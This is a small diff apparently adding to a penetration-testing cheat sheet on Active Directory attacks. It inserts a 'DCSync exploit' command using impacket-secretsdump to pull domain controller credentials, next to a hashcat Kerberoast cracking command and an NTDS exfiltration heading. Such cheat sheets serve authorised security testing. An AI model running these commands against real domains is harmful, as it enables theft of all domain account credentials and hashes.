@@ -129,6 +129,11 @@ Crack hashes :
 hashcat -m 13100 hashes.kerberoast wordlist -O
 ```
 
+DCSync exploit :
+```markdown
+impacket-secretsdump -just-dc <domain>/<user>:<password>@<ipaddress>
+```
+
 ### NTDS Exfiltration
 
 Dump NTDS :
